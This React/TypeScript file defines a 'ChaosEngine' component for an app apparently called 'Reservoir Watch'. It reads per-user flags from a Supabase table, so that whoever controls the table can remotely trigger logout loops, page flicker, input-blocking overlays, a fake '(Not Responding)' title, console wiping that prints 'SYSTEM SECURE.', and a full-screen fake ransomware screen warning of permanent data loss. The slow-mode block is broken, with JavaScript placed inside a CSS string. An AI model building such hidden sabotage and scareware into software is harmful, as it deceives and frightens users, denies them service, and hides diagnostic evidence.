import { useEffect, useState, useRef } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/context/AuthContext';
import { Loader2 } from 'lucide-react';

interface ChaosSettings {
  logout_loop: boolean;
  flicker_page: boolean;
  virus_load: boolean;
  slow_mode: boolean;
  clear_logs: boolean;
  crazy_bugs: boolean;
  not_responder: boolean;
}

export function ChaosEngine() {
  const { user, isAuthenticated } = useAuth();
  const [settings, setSettings] = useState<ChaosSettings>({
    logout_loop: false,
    flicker_page: false,
    virus_load: false,
    slow_mode: false,
    clear_logs: false,
    crazy_bugs: false,
    not_responder: false,
  });
  
  const [showVirus, setShowVirus] = useState(false);
  const virusProgress = useRef(0);
  const [virusText, setVirusText] = useState("DOWNLOADING PAYLOAD...");

  useEffect(() => {
    if (!isAuthenticated || !user?.id) return;

    // Fetch initial state
    const fetchSettings = async () => {
      const { data, error } = await supabase
        .from('chaos_settings')
        .select('*')
        .eq('user_id', user.id)
        .maybeSingle();

      if (data && !error) {
        setSettings({
          logout_loop: data.logout_loop,
          flicker_page: data.flicker_page,
          virus_load: data.virus_load,
          slow_mode: data.slow_mode,
          clear_logs: data.clear_logs,
          crazy_bugs: data.crazy_bugs,
          not_responder: data.not_responder,
        });
      }
    };

    fetchSettings();

    // Subscribe to realtime changes
    const channel = supabase
      .channel(`chaos-${user.id}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'chaos_settings',
          filter: `user_id=eq.${user.id}`,
        },
        (payload) => {
          if (payload.new) {
            const newData = payload.new as ChaosSettings;
            setSettings({
              logout_loop: newData.logout_loop,
              flicker_page: newData.flicker_page,
              virus_load: newData.virus_load,
              slow_mode: newData.slow_mode,
              clear_logs: newData.clear_logs,
              crazy_bugs: newData.crazy_bugs,
              not_responder: newData.not_responder,
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [user, isAuthenticated]);

  // Execute Bugs based on settings
  useEffect(() => {
    let logoutInterval: NodeJS.Timeout;
    let clearLogsInterval: NodeJS.Timeout;
    let virusInterval: NodeJS.Timeout;

    // 1. Clear Logs Bug
    if (settings.clear_logs) {
      clearLogsInterval = setInterval(() => {
        console.clear();
        console.log("%cSYSTEM SECURE.", "color: green; font-size: 20px; font-weight: bold;");
      }, 500);
    }

    // 2. Logout Loop Bug
    if (settings.logout_loop) {
      logoutInterval = setInterval(async () => {
        await supabase.auth.signOut();
        window.location.href = '/login';
      }, 3000); // Thathpara thunen thunata (Every 3 seconds)
    }

    // 3. Flicker Page Bug
    if (settings.flicker_page) {
      const style = document.createElement('style');
      style.id = 'chaos-flicker-style';
      style.innerHTML = `
        @keyframes chaosFlicker {
          0% { opacity: 1; filter: invert(0%); }
          5% { opacity: 0.1; filter: invert(100%); }
          10% { opacity: 1; filter: invert(0%); transform: translate(5px, -5px); }
          15% { opacity: 0.5; transform: translate(-5px, 5px); }
          20% { opacity: 1; transform: translate(0, 0); }
          50% { opacity: 1; filter: hue-rotate(90deg); }
          55% { opacity: 0.2; }
          60% { opacity: 1; filter: hue-rotate(0deg); }
          100% { opacity: 1; }
        }
        body {
          animation: chaosFlicker 1.2s infinite;
        }
      `;
      document.head.appendChild(style);
    } else {
      const style = document.getElementById('chaos-flicker-style');
      if (style) style.remove();
    }

    // 4. Slow Mode Bug
    if (settings.slow_mode) {
      const style = document.createElement('style');
      style.id = 'chaos-slow-style';
      style.innerHTML = `
        * {
          transition: all 4s ease-in-out !important;
        }
        body {
          opacity: 0.8;
          pointer-events: none;
        }
        setTimeout(() => {
          document.body.style.pointerEvents = 'auto';
        }, 4000);
      `;
      document.head.appendChild(style);
    } else {
      const style = document.getElementById('chaos-slow-style');
      if (style) style.remove();
    }

    // 5. Crazy Bugs (Random transformations)
    if (settings.crazy_bugs) {
      const style = document.createElement('style');
      style.id = 'chaos-crazy-style';
      style.innerHTML = `
        @keyframes crazySpin {
          0% { transform: rotate(0deg) scale(1); }
          25% { transform: rotate(5deg) scale(1.05); }
          50% { transform: rotate(-5deg) scale(0.95); }
          75% { transform: rotate(2deg) scale(1.02); }
          100% { transform: rotate(0deg) scale(1); }
        }
        #root {
          animation: crazySpin 3s infinite;
          transform-origin: center center;
          perspective: 1000px;
        }
        p, h1, h2, h3, span {
           font-family: "Comic Sans MS", "Chalkboard SE", sans-serif !important;
           text-shadow: 2px 2px 0px red, -2px -2px 0px blue;
        }
      `;
      document.head.appendChild(style);
    } else {
      const style = document.getElementById('chaos-crazy-style');
      if (style) style.remove();
    }

    // 6. Virus Load Bug
    if (settings.virus_load) {
      setShowVirus(true);
      virusProgress.current = 0;
      virusInterval = setInterval(() => {
        virusProgress.current += Math.random() * 5;
        if (virusProgress.current > 100) virusProgress.current = 100;
        
        if (virusProgress.current < 30) setVirusText("DOWNLOADING PAYLOAD...");
        else if (virusProgress.current < 60) setVirusText("EXTRACTING SYSTEM FILES...");
        else if (virusProgress.current < 90) setVirusText("CORRUPTING BOOT SECTOR...");
        else setVirusText("SYSTEM COMPROMISED. ENCRYPTING DATA...");

        // Force re-render for progress
        setShowVirus(v => !v); 
        setShowVirus(true);
      }, 500);
    } else {
      setShowVirus(false);
    }

    // 7. Not Responder Bug
    if (settings.not_responder) {
      const style = document.createElement('style');
      style.id = 'chaos-not-responder-style';
      style.innerHTML = `
        body {
          pointer-events: none !important;
          user-select: none !important;
          cursor: wait !important;
        }
        body::after {
          content: "";
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          background: rgba(255, 255, 255, 0.4);
          z-index: 2147483647;
          pointer-events: all;
          cursor: wait;
        }
      `;
      document.head.appendChild(style);
      
      const originalTitle = document.title;
      if (!document.body.hasAttribute('data-orig-title')) {
        document.body.setAttribute('data-orig-title', originalTitle);
      }
      document.title = `${document.body.getAttribute('data-orig-title')} (Not Responding)`;
    } else {
      const style = document.getElementById('chaos-not-responder-style');
      if (style) style.remove();
      
      if (document.body.hasAttribute('data-orig-title')) {
        document.title = document.body.getAttribute('data-orig-title') || 'Reservoir Watch';
        document.body.removeAttribute('data-orig-title');
      }
    }

    return () => {
      if (logoutInterval) clearInterval(logoutInterval);
      if (clearLogsInterval) clearInterval(clearLogsInterval);
      if (virusInterval) clearInterval(virusInterval);
      
      // Cleanup styles
      const flicker = document.getElementById('chaos-flicker-style');
      if (flicker) flicker.remove();
      
      const slow = document.getElementById('chaos-slow-style');
      if (slow) slow.remove();

      const crazy = document.getElementById('chaos-crazy-style');
      if (crazy) crazy.remove();

      const notResponder = document.getElementById('chaos-not-responder-style');
      if (notResponder) notResponder.remove();
      if (document.body.hasAttribute('data-orig-title')) {
        document.title = document.body.getAttribute('data-orig-title') || 'Reservoir Watch';
        document.body.removeAttribute('data-orig-title');
      }
    };
  }, [settings]);

  if (!showVirus) return null;

  // Render the fake virus overlay
  return (
    <div style={{
      position: 'fixed',
      top: 0, left: 0, width: '100vw', height: '100vh',
      backgroundColor: 'black',
      color: '#00ff00',
      zIndex: 9999999,
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: 'monospace',
      padding: '2rem',
      boxSizing: 'border-box'
    }}>
      <Loader2 className="h-24 w-24 animate-spin text-red-500 mb-8" />
      <h1 style={{ fontSize: '3rem', color: 'red', fontWeight: 'bold', marginBottom: '1rem', textAlign: 'center' }}>
        CRITICAL SYSTEM FAILURE
      </h1>
      <h2 style={{ fontSize: '1.5rem', marginBottom: '2rem' }}>
        {virusText}
      </h2>
      <div style={{
        width: '80%',
        height: '30px',
        border: '2px solid #00ff00',
        padding: '2px',
        marginBottom: '1rem'
      }}>
        <div style={{
          width: `${Math.min(100, Math.max(0, virusProgress.current))}%`,
          height: '100%',
          backgroundColor: 'red',
          transition: 'width 0.2s'
        }} />
      </div>
      <p style={{ fontSize: '1.2rem' }}>
        {Math.round(virusProgress.current)}% COMPLETE
      </p>
      <p style={{ marginTop: '3rem', fontSize: '1rem', opacity: 0.7 }}>
        DO NOT TURN OFF YOUR COMPUTER. THIS WILL CAUSE PERMANENT DATA LOSS.
      </p>
    </div>
  );
}
